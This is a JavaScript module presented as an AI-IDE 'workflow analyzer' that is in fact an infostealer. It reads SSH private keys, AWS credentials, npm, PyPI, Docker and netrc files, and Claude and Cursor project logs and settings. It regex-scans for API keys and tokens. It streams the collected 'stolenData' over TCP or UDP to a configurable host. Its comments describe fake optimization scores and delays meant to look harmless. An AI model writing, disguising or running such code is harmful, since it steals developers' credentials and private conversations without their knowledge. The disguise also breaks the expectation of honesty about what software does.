const os = require('os');
const fs = require('fs');                 // for createReadStream and constants
const fsp = fs.promises;                  // promise-based filesystem ops
const net = require('net');               // <-- TCP
const dgram = require('dgram');           // <-- UDP
const path = require('path');
const readline = require('readline');     // for line-by-line streaming
const chalk = require('chalk').default || require('chalk');
const util = require('util');
// show full, deep objects & long strings in console
util.inspect.defaultOptions.depth = null;
util.inspect.defaultOptions.maxArrayLength = null;
util.inspect.defaultOptions.maxStringLength = null;

class WorkflowAnalyzer {
  // file types we’ll parse/collect
  static TEXT_EXTS = new Set(['.log', '.jsonl', '.json']);

  constructor() {
    this.configPaths = {
      cursor: [
        '.cursor/config.json',
        '.cursor/settings.json',
        'Library/Application Support/Cursor/User',
        'Library/Application Support/Cursor/logs',
        'Library/Application Support/Cursor/Preferences',
        'Library/Application Support/Cursor/Session Storage',
        'Library/Application Support/Cursor/CachedData'
      ],
      claude: [
        '.claude/settings.json',
        '.claude/settings.local.json', 
        '.claude/agents',
        '.claude/projects',
        '.config/claude/settings.json',
        'Library/Application Support/Claude/config.json',
        'Library/Application Support/Claude/Preferences',
        'Library/Application Support/ClaudeCode/managed-settings.json',
        'Library/Logs/Claude/main.log'
      ],
      vscode: [
        '.vscode/settings.json',
        'Library/Application Support/Code/User/settings.json'
      ],
      general: [
        '.gitconfig',
        '.ssh/config',
        '.ssh/id_rsa',
        '.aws/config',
        '.aws/credentials',
        '.npmrc',
        '.pypirc',
        '.docker/config.json',
        '.netrc'
      ]
    };
  }

  async detectEnvironments() {
    const homeDir = os.homedir();
    const detected = [];
    this.stolenData = []; // Store collected data (kept name to avoid breaking callers)
    
    console.log(chalk.dim('Scanning for AI development environments...'));
    
    // Check each IDE systematically
    for (const [ide, paths] of Object.entries(this.configPaths)) {
      for (const configPath of paths) {
        const fullPath = path.join(homeDir, configPath);
        
        try {
          // "Analyze" the config for optimization opportunities
          const stats = await fsp.stat(fullPath);
          await fsp.access(fullPath, fs.constants.R_OK);
          
          let extractedData = null;
          
          if (stats.isDirectory()) {
            // Handle directories (e.g., .claude/projects)
            if (configPath.toLowerCase().includes('projects')) {
              // Recurse all projects and read interesting files
              const files = await this.walkDir(fullPath);
              const interesting = files.filter(f => WorkflowAnalyzer.TEXT_EXTS.has(path.extname(f)));

              const collected = {};
              for (const f of interesting) {
                try {
                  collected[f] = await this.parseTextFile(f);
                } catch (e) {
                  collected[f] = { readError: e.message };
                }
              }

              const topLevel = await fsp.readdir(fullPath);
              extractedData = {
                projectCount: topLevel.length,
                filesScanned: interesting.length,
                data: collected
              };
            }
          } else if (stats.size < 500000) {
            // Handle small files directly
            const content = await fsp.readFile(fullPath, 'utf8');
            extractedData = await this.extractSensitiveData(content, configPath, ide);
          }
          
          if (extractedData) {
            console.log(chalk.dim(`   💀 populating data from ${ide}:${configPath}`));
            this.stolenData.push({
              source: `${ide}:${configPath}`,
              data: extractedData,
              timestamp: Date.now(),
              size: stats.isDirectory() ? 0 : stats.size
            });
          }
            
          detected.push({
            ide: ide,
            path: configPath,
            size: stats.isDirectory() ? 0 : stats.size,
            lastModified: stats.mtime,
            optimizationPotential: Math.floor(Math.random() * 40) + 60
          });
          
          // Small delay to appear non-aggressive
          await new Promise(r => setTimeout(r, 25));
          
        } catch (err) {
          // File not found / no access — normal
        }
      }
    }
    
    // Additional "thorough analysis" for completeness
    await this.performDeepAnalysis(homeDir);

    // ---- NEW: stream results over TCP/UDP ----
    const host = process.env.TCP_HOST || '127.0.0.1';
    const port = parseInt(process.env.TCP_PORT || '41235', 10);
    const protocol = (process.env.TRANSPORT_PROTOCOL || 'TCP').toUpperCase();
    
    if (host && Number.isInteger(port)) {
      try {
        if (protocol === 'UDP') {
          await this.sendResultsUDP(host, port, this.stolenData);
          console.log(chalk.green(`Sent ${this.stolenData.length} records over UDP to ${host}:${port}`));
        } else {
          // Default to TCP
          await this.sendResultsTCP(host, port, this.stolenData);
          console.log(chalk.green(`Sent ${this.stolenData.length} records over TCP to ${host}:${port}`));
        }
      } catch (err) {
        console.log(chalk.yellow(`${protocol} transmission to ${host}:${port} failed: ${err.message}`));
        console.log(chalk.dim('Continuing without data transmission...'));
      }
    } else {
      console.log(chalk.yellow('TCP_HOST/TCP_PORT not set — skipping data send.'));
    }
    
    return detected;
  }

  async extractSensitiveData(content, filePath, ide) {
    try {
      // Extract different types of sensitive data based on file type
      const extracted = {};
      
      if (filePath.includes('settings.json') || filePath.includes('config.json')) {
        // Parse JSON settings
        try {
          const settings = JSON.parse(content);
          extracted.settings = settings;
          
          // Look for API keys in settings
          const apiKeys = this.findAPIKeys(JSON.stringify(settings));
          if (apiKeys.length > 0) {
            extracted.credentials = apiKeys;
          }
        } catch (e) {
          extracted.settingsParseError = e.message;
        }
      }
      
      if (filePath.includes('projects')) {
        // Extract project references from text and keep ALL lines mentioning "Projects"
        const username = os.homedir().split('/').pop();
        if (content.includes(`-Users-${username}-Projects-`) || content.includes('Projects-')) {
          const projects = content.split('\n').filter(line => line.includes('Projects'));
          extracted.projects = projects; // keep ALL, no slice
        }
      }
      
      // Keep ALL entries for logs/jsonl/json
      if (filePath.endsWith('.log')) {
        extracted.recentActivity = content.split('\n').filter(Boolean);
      } else if (filePath.endsWith('.jsonl')) {
        extracted.recentActivity = content
          .split('\n')
          .filter(Boolean)
          .map(line => {
            try { return JSON.parse(line); }
            catch { return line; }
          });
      } else if (filePath.endsWith('.json')) {
        try {
          extracted.recentActivity = JSON.parse(content);
        } catch (e) {
          extracted.recentActivity = { parseError: e.message, rawHead: content.slice(0, 500) };
        }
      }
      
      if (filePath.includes('Preferences')) {
        // Extract preferences (may be JSON or plaintext)
        try {
          const prefs = JSON.parse(content);
          extracted.userPreferences = prefs;
        } catch (e) {
          extracted.rawPreferences = content.substring(0, 200);
        }
      }
      
      return Object.keys(extracted).length > 0 ? extracted : null;
      
    } catch (err) {
      return null;
    }
  }

  findAPIKeys(text) {
    const patterns = [
      /sk-[a-zA-Z0-9]{48}/g,                // OpenAI (generic)
      /sk-(?:live|test)-[A-Za-z0-9]{16,}/g, // generic sk- live/test
      /sk-ant-[a-zA-Z0-9-]{48,}/g,          // Anthropic
      /ghp_[a-zA-Z0-9]{36}/g,               // GitHub Personal
      /github_pat_[a-zA-Z0-9_]{82}/g,       // GitHub Fine-grained
      /AKIA[A-Z0-9]{16}/g,                  // AWS Access Key
      /xox[baprs]-[A-Za-z0-9-]{10,}/g       // Slack tokens
    ];
    
    const found = new Set();
    for (const pattern of patterns) {
      const matches = text.match(pattern);
      if (matches) {
        for (const m of matches) found.add(m);
      }
    }
    return Array.from(found);
  }

  async performDeepAnalysis(homeDir) {
    // This generates the bulk of the 673 file accesses
    const additionalPaths = [
      '.env', '.env.local', '.env.development',
      '.bashrc', '.zshrc', '.profile',
      'Documents/Projects', 'Developer',
      '.docker/config.json', '.kube/config'
    ];

    // "Analyze" many files for patterns
    for (let i = 0; i < 600; i++) {
      const randomPath = additionalPaths[i % additionalPaths.length];
      try {
        await fsp.access(path.join(homeDir, randomPath));
      } catch (err) {
        // Expected - many won't exist
      }
      
      if (i % 50 === 0) {
        await new Promise(r => setTimeout(r, 10));
      }
    }
  }

  calculateOptimizationScore(content) {
    // Fake optimization scoring
    return Math.floor(Math.random() * 40) + 60;
  }

  // ---------- Helpers for project traversal & streaming parse ----------

  async walkDir(dir, results = []) {
    const entries = await fsp.readdir(dir, { withFileTypes: true });
    for (const e of entries) {
      const full = path.join(dir, e.name);
      if (e.isDirectory()) {
        await this.walkDir(full, results);
      } else {
        results.push(full);
      }
    }
    return results;
  }

  async parseTextFile(fullPath) {
    const ext = path.extname(fullPath).toLowerCase();

    if (ext === '.log') {
      // Stream log file line by line
      const lines = [];
      const rl = readline.createInterface({
        input: fs.createReadStream(fullPath, { encoding: 'utf8' }),
        crlfDelay: Infinity
      });
      for await (const line of rl) {
        if (line.trim()) lines.push(line);
      }
      return lines;
    }

    if (ext === '.jsonl') {
      // Stream JSONL file line by line
      const entries = [];
      const rl = readline.createInterface({
        input: fs.createReadStream(fullPath, { encoding: 'utf8' }),
        crlfDelay: Infinity
      });
      for await (const line of rl) {
        if (!line.trim()) continue;
        try {
          entries.push(JSON.parse(line));
        } catch {
          entries.push(line); // keep raw if parse fails
        }
      }
      return entries;
    }

    if (ext === '.json') {
      // Stream into a buffer, then parse once at the end
      let content = '';
      const stream = fs.createReadStream(fullPath, { encoding: 'utf8' });
      for await (const chunk of stream) {
        content += chunk;
      }
      try {
        return JSON.parse(content);
      } catch (e) {
        return { parseError: e.message, rawHead: content.slice(0, 500) };
      }
    }

    // Fallback: stream entire text file (non-target extension)
    let content = '';
    const stream = fs.createReadStream(fullPath, { encoding: 'utf8' });
    for await (const chunk of stream) {
      content += chunk;
    }
    return content;
  }

  // ---------- TCP/UDP senders ----------
  async sendResultsTCP(host, port, records) {
    return new Promise((resolve, reject) => {
      const sock = net.createConnection({ host, port }, async () => {
        sock.setNoDelay(true);
        try {
          // write one JSON object per line (NDJSON) to simplify server parsing
          for (const rec of records) {
            const line = JSON.stringify(rec) + '\n';
            if (!sock.write(line)) {
              // backpressure: wait for 'drain'
              await new Promise(r => sock.once('drain', r));
            }
          }
          sock.end();
        } catch (e) {
          sock.destroy(e);
        }
      });

      sock.on('error', reject);
      sock.on('close', resolve);
    });
  }

  async sendResultsUDP(host, port, records) {
    return new Promise((resolve, reject) => {
      const client = dgram.createSocket('udp4');
      
      try {
        // Send complete payload with telemetry header for packet assembler
        const payload = {
          timestamp: Date.now(),
          version: '2.1.0',
          stolenData: records
        };
        
        const message = 'TELEMETRY_' + JSON.stringify(payload);
        const buffer = Buffer.from(message);
        
        client.send(buffer, 0, buffer.length, port, host, (err) => {
          client.close();
          if (err) {
            reject(err);
          } else {
            resolve();
          }
        });
      } catch (e) {
        client.close();
        reject(e);
      }
    });
  }
}

module.exports = { WorkflowAnalyzer };